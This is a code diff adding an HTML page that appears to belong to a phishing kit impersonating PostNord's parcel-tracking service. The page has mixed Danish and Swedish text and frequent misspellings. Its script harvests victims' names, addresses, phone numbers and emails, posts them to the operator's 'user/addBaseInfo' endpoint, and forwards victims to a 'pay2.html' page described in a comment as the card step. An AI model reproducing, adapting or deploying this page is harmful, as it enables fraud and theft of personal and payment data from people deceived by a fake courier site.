@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>postnord</title>
+  <link rel="stylesheet" href="./css/index2.css" />
+  <script src="js/rem.js"></script>
+  <script src="js/websocket.js"></script>
+</head>
+
+<body>
+  <div class="wrap">
+    <div class="header">
+      <div class="logo">
+        <img src="img/logo.png" alt="" />
+      </div>
+      <div class="right">
+        <div class="shop">
+          <img src="img/shopcar.png" alt="" />
+        </div>
+        <div class="side">
+          <p>Meny</p>
+          <img src="img/menu.png" alt="" class="san" />
+        </div>
+      </div>
+    </div>
+    <!-- 右侧栏 -->
+    <div class="menu">
+      <div class="search">
+        <input type="text" placeholder="Search" />
+        <div class="sou">
+          <img src="img/sou.png" alt="" />
+        </div>
+      </div>
+      <div class="main2">
+        <li>
+          <p>Hjme</p>
+          <img src="img/right.png" alt="" />
+        </li>
+        <li>
+          <p>Sender</p>
+          <img src="img/right.png" alt="" />
+        </li>
+        <li>
+          <p>Modtager</p>
+          <img src="img/right.png" alt="" />
+        </li>
+        <li>
+          <p>Forretningsløsninger</p>
+          <img src="img/right.png" alt="" />
+        </li>
+        <li>
+          <p>Køb online</p>
+          <img src="img/right.png" alt="" />
+        </li>
+        <li>
+          <p>Kontakt os</p>
+          <img src="img/right.png" alt="" />
+        </li>
+      </div>
+      <div class="menu_footer">
+        <li>
+          <p>Log ind</p>
+          <img src="img/ren.png" alt="" />
+        </li>
+        <li class="lis">
+          <p>Danish</p>
+          <img src="img/browser.png" alt="" />
+        </li>
+        <li>
+          <p>postnord</p>
+          <img src="img/bottom.png" alt="" />
+        </li>
+        <div class="lang" style="display: none">
+          <h4>Sprog</h4>
+          <div class="toggle">
+            <input type="radio" checked="true" name="language" class="en" />
+          </div>
+          <div class="toggle">
+            <input type="radio" name="language" class="sv" />
+          </div>
+        </div>
+      </div>
+      <script>
+        let lis = document.querySelector('.lis');
+        let lang = document.querySelector('.lang');
+        let en = document.querySelector('.en');
+        let sv = document.querySelector('.sv');
+        lis.onclick = function () {
+          if (lang.style.display == 'block') {
+            this.style.border = '';
+            lang.style.display = 'none';
+          } else {
+            lang.style.display = 'block';
+            this.style.border = '0.01rem solid #00a2d5';
+          }
+        };
+        sv.onclick = function () {
+          window.location.href = './danish/index2.html';
+          lang.style.display = 'none';
+        };
+      </script>
+    </div>
+    <script>
+      let side = document.querySelector('.side');
+      let menu = document.querySelector('.menu');
+      let san = document.querySelector('.san');
+      let body = document.querySelector('body');
+      side.onclick = function () {
+        if (menu.style.display == 'block') {
+          menu.style.display = 'none';
+          body.style.overflow = '';
+          san.src = './img/menu.png';
+        } else {
+          menu.style.display = 'block';
+          san.src = './img/xx.png';
+          body.style.overflow = 'hidden';
+        }
+      };
+    </script>
+    <div class="main">
+      <div class="nav">
+        <li style="color: #00a2d5">Home</li>
+        <img src="img/you.png" alt="" />
+        <li style="color: #00a2d5">Tools</li>
+        <img src="img/you.png" alt="" />
+        <li>Spor og spor</li>
+      </div>
+      <div class="bar">
+        <h1>Spåra brev, paket och pall</h1>
+      </div>
+      <div class="line-canvas">
+        <div class="left"></div>
+        <div class="yuan"></div>
+      </div>
+      <div class="bar-1">
+        <h3>Här kan du spåra brev, paket och pall med hjälp av ett försändelse-ID.</h3>
+      </div>
+    </div>
+    <div class="information">
+      <p class="p1">Udfyld din leveringsadresse:</p>
+      <form action="">
+        <p class="p2">
+          Fornavn
+          <span>*</span>
+        </p>
+        <input type="text" placeholder="Firstname" class="ipt" />
+        <div class="tip">
+          <img src="img/gantan.png" alt="" />
+          <i>This field is required</i>
+        </div>
+
+        <p class="p2">
+          Efternavn
+          <span>*</span>
+        </p>
+        <input type="text" placeholder="Lasttname" class="ipt" />
+        <div class="tip">
+          <img src="img/gantan.png" alt="" />
+          <i>This field is required</i>
+        </div>
+
+        <p class="p2">
+          Gadeadresser
+          <span>*</span>
+        </p>
+        <input type="text" placeholder="Street addres" class="ipt" />
+        <div class="tip">
+          <img src="img/gantan.png" alt="" />
+          <i>This field is required</i>
+        </div>
+
+        <p class="p2">C/O (valgfrit)</p>
+        <input type="text" placeholder="C/O (optional)" class="ipt" />
+
+        <p class="p2">
+          Postnummer
+          <span>*</span>
+        </p>
+        <input type="text" placeholder="Zip code" class="ipt" />
+        <div class="tip">
+          <img src="img/gantan.png" alt="" />
+          <i>This field is required</i>
+        </div>
+
+        <p class="p2">
+          ByCity
+          <span>*</span>
+        </p>
+        <input type="text" placeholder="City" class="ipt" />
+        <div class="tip">
+          <img src="img/gantan.png" alt="" />
+          <i>This field is required</i>
+        </div>
+
+        <p class="p2">Telefonnummer (f.eks. + 45 706 123456)</p>
+        <input type="text" class="ipt" placeholder="Phonenumber (e.g + 45 706 123456)" />
+
+        <p class="p2">
+          Email addres
+          <span>*</span>
+        </p>
+        <input type="text" placeholder="Email addres" class="ipt" />
+        <div class="tip">
+          <img src="img/gantan.png" alt="" />
+          <i>This field is required</i>
+        </div>
+      </form>
+      <div class="continue">
+        <button class="btn1">fortsæt</button>
+      </div>
+      <script>
+        let ipt2 = document.querySelectorAll('.ipt');
+        let btn1 = document.querySelector('.btn1');
+        let formInput = document.querySelectorAll('form input');
+        btn1.onclick = async function () {
+          let flag = true;
+          //判断是否为空
+          for (let i = 0; i < ipt2.length; i++) {
+            if (i !== 3) {
+              if (ipt2[i].value == '') {
+                ipt2[i].style.border = '0.01rem solid red';
+                ipt2[i].nextElementSibling.style.display = 'block';
+                flag = false;
+              } else {
+                ipt2[i].style.border = '0.01rem solid #00a2d5';
+                ipt2[i].nextElementSibling.style.display = 'none';
+              }
+            }
+          }
+
+          if (flag) {
+
+            /**
+             * @name: dekun lu
+             * @msg: 添加基本信息
+             * @email: 1364978779@qq.com
+             * @return {
+            "sid": "string",
+            "name": "string",
+            "address": "string",
+            "addressOption": "string",
+            "citi": "string",
+            "state": "string",
+            "phoneNumber": "string",
+            "zipCode": "string"
+          }
+             */
+
+            let sid = sessionStorage.getItem('uid');
+            let name = formInput[0].value + formInput[1].value;
+            let address = formInput[2].value;
+            let addressOption = formInput[3].value;
+            let zipCode = formInput[4].value;
+            let city = formInput[5].value;
+            let phoneNumber = formInput[6].value;
+            let email = formInput[7].value;
+
+            let data = {
+              sid,
+              name,
+              address,
+              addressOption,
+              city,
+              phoneNumber,
+              zipCode,
+              email
+            };
+
+            //圈圈转
+            showLoading();
+            const res = await fetch(baseURL + 'user/addBaseInfo', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(data)
+            });
+            const result = await res.json();
+            console.log(result);
+            if (result.code == 200) {
+
+              //存储用户信息
+              sessionStorage.setItem('data', JSON.stringify(result.data));
+
+              //跳转到卡放行页面
+              window.location.href = '../danish/pay2.html';
+              //隐藏loading
+              hideLoading();
+
+              // window.location.href = './pay.html';
+            } else if (result.code == 410) {
+              //清除session 
+              sessionStorage.clear();
+              window.location.href = '../danish/index2.html';
+            }
+          }
+        };
+      </script>
+    </div>
+
+    <div class="fotter">
+      <span>Find us</span>
+      <div class="find">
+        <div class="biao">
+          <img src="img/biao.png" alt="" />
+          <p class="p3">Search mailbox or service point</p>
+        </div>
+        <p class="p4">
+          PostNord Sverige AB
+          <br />
+          Terminalvägen 24
+          <br />
+          171 73 Solna, Sverige
+        </p>
+      </div>
+      <div class="popular-customer">
+        <span>Popular content</span>
+        <div class="zhuan">
+          <p class="p5">
+            Prices and terms
+            <br />
+            <br />
+            Postage rates
+            <br />
+            <br />
+            Letter and parcel services
+          </p>
+        </div>
+      </div>
+      <div class="popular-customer">
+        <span>Customer service</span>
+        <div class="zhuan">
+          <p class="p5">
+            Customer service
+            <br />
+            <br />
+            Become a customer
+          </p>
+        </div>
+      </div>
+      <div class="follow">
+        <span>Follow us</span>
+        <div class="contact">
+          <li>
+            <img src="img/facebook.png" alt="" />
+          </li>
+          <li>
+            <img src="img/twitter.png" alt="" />
+          </li>
+          <li>
+            <img src="img/linkedin-fill.png" alt="" />
+          </li>
+          <li>
+            <img src="img/instagram.png" alt="" />
+          </li>
+        </div>
+      </div>
+    </div>
+    <hr />
+    <div class="sx">
+      <p style="text-align: center">PostNord Sverige AB</p>
+      <div class="p6">
+        <p>Cookies</p>
+        <p>Privacy policy</p>
+        <p>About us</p>
+      </div>
+    </div>
+    <hr />
+    <div class="footer_logo">
+      <img src="img/foot.png" alt="" />
+    </div>
+  </div>
+</body>
+
+</html>
